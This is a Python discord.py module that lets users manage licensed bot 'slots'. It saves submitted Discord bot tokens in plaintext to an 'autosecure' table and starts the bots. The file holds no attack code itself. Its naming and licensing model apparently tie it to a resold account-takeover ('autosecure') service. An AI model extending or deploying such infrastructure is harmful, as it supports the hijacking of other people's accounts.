
import discord
from discord.ext import commands
from discord import app_commands, ui
from core.database import db
from core.bot_manager import start_bot, stop_bot, active_bots
import time
import asyncio

class BotModal(ui.Modal, title="Configure Bot"):
    token = ui.TextInput(label="Discord Bot Token", placeholder="MT...", required=True)
    
    def __init__(self, bot, user_id, bot_number):
        super().__init__()
        self.bot = bot
        self.user_id = user_id
        self.bot_number = bot_number

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        token_str = self.token.value.strip()
        
        now = int(time.time())
        existing = await db.query("SELECT * FROM autosecure WHERE user_id=? AND botnumber=?", [self.user_id, self.bot_number], "get")
        
        if existing:
             await db.query("UPDATE autosecure SET token=?, creationdate=? WHERE user_id=? AND botnumber=?", [token_str, now, self.user_id, self.bot_number])
        else:
             await db.query("INSERT INTO autosecure (user_id, botnumber, token, creationdate) VALUES (?, ?, ?, ?)", [self.user_id, self.bot_number, token_str, now])
             
        started = await start_bot(token_str, self.user_id, self.bot_number)
        
        if started:
            await interaction.followup.send(f"Bot #{self.bot_number} started! Use `/ready` in your bot's server.", ephemeral=True)
        else:
            await interaction.followup.send(f"Failed to start bot #{self.bot_number}. Check token.", ephemeral=True)

class BotsPanel(ui.View):
    def __init__(self, bot, user_id, slots, bots):
        super().__init__()
        self.bot = bot
        self.user_id = user_id
        self.slots = slots
        self.bots = bots
        
        self.update_components()
        
    def update_components(self):
        self.clear_items()
        
        options = []
        for b in self.bots:
            num = b['botnumber']
            key = f"{self.user_id}|{num}"
            status = "🟢 Online" if key in active_bots else "🔴 Offline"
            options.append(discord.SelectOption(label=f"Bot #{num} - {status}", value=f"bot_{num}"))
            
        if len(self.bots) < self.slots:
            next_num = self.get_next_number()
            options.append(discord.SelectOption(label="➕ Create New Bot", value=f"new_{next_num}", description="Add a new bot instance"))
            
        if options:
            select = ui.Select(placeholder="Select a bot to manage...", options=options[:25])
            select.callback = self.select_callback
            self.add_item(select)
            
    def get_next_number(self):
        used = [b['botnumber'] for b in self.bots]
        for i in range(1, 100):
            if i not in used: return i
        return len(used) + 1

    async def select_callback(self, interaction: discord.Interaction):
        val = interaction.data['values'][0]
        
        if val.startswith("new_"):
            num = int(val.split("_")[1])
            await interaction.response.send_modal(BotModal(self.bot, self.user_id, num))
            
        elif val.startswith("bot_"):
            num = int(val.split("_")[1])
            await interaction.response.send_modal(BotModal(self.bot, self.user_id, num))

class UserBots(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="bots", description="Manage your bots")
    async def bots(self, interaction: discord.Interaction):
        user_id = str(interaction.user.id)
        
        slots_data = await db.query("SELECT slots FROM slots WHERE user_id=?", [user_id], "get")
        slots = slots_data['slots'] if slots_data else 0
        
        bots = await db.query("SELECT * FROM autosecure WHERE user_id=?", [user_id])
        
        embed = discord.Embed(title="Bot Management", color=0x00aaff)
        embed.description = f"You have **{len(bots)}/{slots}** active bots."
        
        if slots == 0:
            embed.description += "\n\n⚠️ You have no slots! Purchase a license or redeem a key."
            return await interaction.response.send_message(embeds=[embed], ephemeral=True)
            
        view = BotsPanel(self.bot, user_id, slots, bots)
        await interaction.response.send_message(embeds=[embed], view=view, ephemeral=True)

async def setup(bot):
    await bot.add_cog(UserBots(bot))
